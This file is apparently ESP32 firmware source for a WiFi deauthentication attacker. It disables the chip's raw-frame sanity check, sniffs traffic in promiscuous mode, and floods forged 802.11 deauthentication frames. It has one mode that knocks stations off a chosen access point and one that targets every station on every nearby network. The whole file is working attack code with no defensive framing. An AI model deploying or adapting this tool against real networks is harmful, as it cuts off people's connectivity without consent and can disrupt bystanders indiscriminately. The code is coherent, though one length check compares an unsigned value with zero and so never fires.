#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"

deauth_frame_simple_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;

// Override the ESP32 firmware's sanity check for raw frames
// This allows us to send deauthentication frames
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

// Function prototype for sending raw 802.11 frames
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

// Packet sniffer callback - monitors WiFi traffic and sends deauth frames
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // Single network deauth: target specific AP
    // Check if packet is destined for our target AP
    if (memcmp(mac_header->dest, deauth_frame.bssid, 6) == 0) {
      // Found a station communicating with target AP
      // Update destination to this specific station
      memcpy(deauth_frame.destination, mac_header->src, 6);
      
      // Send multiple deauth frames for reliability
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      }
      eliminated_stations++;
      
      DEBUG_PRINTF("Sent %d Deauth frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", 
                   NUM_FRAMES_PER_DEAUTH,
                   mac_header->src[0], mac_header->src[1], mac_header->src[2],
                   mac_header->src[3], mac_header->src[4], mac_header->src[5]);
      BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    }
  } else {
    // Deauth all networks: target any station communicating with an AP
    // Check if this is a station->AP packet (dest == bssid, not broadcast)
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && 
        (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      
      // Build deauth frame for this station and AP
      memcpy(deauth_frame.destination, mac_header->src, 6);
      memcpy(deauth_frame.source, mac_header->dest, 6);
      memcpy(deauth_frame.bssid, mac_header->dest, 6);
      
      // Send deauth frames
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      }
      
      DEBUG_PRINTF("Sent %d Deauth frames to: %02X:%02X:%02X:%02X:%02X:%02X from AP: %02X:%02X:%02X:%02X:%02X:%02X\n",
                   NUM_FRAMES_PER_DEAUTH,
                   mac_header->src[0], mac_header->src[1], mac_header->src[2],
                   mac_header->src[3], mac_header->src[4], mac_header->src[5],
                   mac_header->dest[0], mac_header->dest[1], mac_header->dest[2],
                   mac_header->dest[3], mac_header->dest[4], mac_header->dest[5]);
      BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
    }
  }
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;

  // Initialize the deauth frame with proper IEEE 802.11 structure
  memset(&deauth_frame, 0, sizeof(deauth_frame));
  
  // Set frame control: Management frame, Deauthentication subtype
  deauth_frame.frame_control[0] = 0xC0;  // Type=00 (Management), Subtype=1100 (Deauth)
  deauth_frame.frame_control[1] = 0x00;  // Flags all zero
  
  // Set duration/ID to 0
  deauth_frame.duration[0] = 0x00;
  deauth_frame.duration[1] = 0x00;
  
  // Set sequence control (can be overridden by hardware)
  deauth_frame.sequence[0] = 0x00;
  deauth_frame.sequence[1] = 0x00;
  
  // Set reason code
  deauth_frame.reason_code = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    // Target a specific network
    DEBUG_PRINT("Starting Deauth Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    DEBUG_PRINTF("Channel: %d, Reason Code: %d\n", WiFi.channel(wifi_number), reason);
    
    // Start AP on same channel as target network
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    
    // Set the target AP's BSSID
    uint8_t* target_bssid = WiFi.BSSID(wifi_number);
    memcpy(deauth_frame.bssid, target_bssid, 6);
    memcpy(deauth_frame.source, target_bssid, 6);
    
    DEBUG_PRINTF("Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
                 target_bssid[0], target_bssid[1], target_bssid[2],
                 target_bssid[3], target_bssid[4], target_bssid[5]);
  } else {
    // Target all networks
    DEBUG_PRINTLN("Starting Deauth Attack on ALL detected stations!");
    DEBUG_PRINTF("Reason Code: %d\n", reason);
    DEBUG_PRINTLN("Scanning all channels 1-" + String(CHANNEL_MAX));
    
    // Disconnect AP and switch to station mode
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  // Enable promiscuous mode to monitor all WiFi traffic
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  
  DEBUG_PRINTLN("Promiscuous mode enabled. Monitoring for targets...");
}

void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth Attack...");
  DEBUG_PRINTF("Total stations eliminated: %d\n", eliminated_stations);
  
  esp_wifi_set_promiscuous(false);
  
  // Restart AP if it was disabled
  if (deauth_type == DEAUTH_TYPE_ALL) {
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    DEBUG_PRINTLN("AP mode restored.");
  }
  
  eliminated_stations = 0;
}
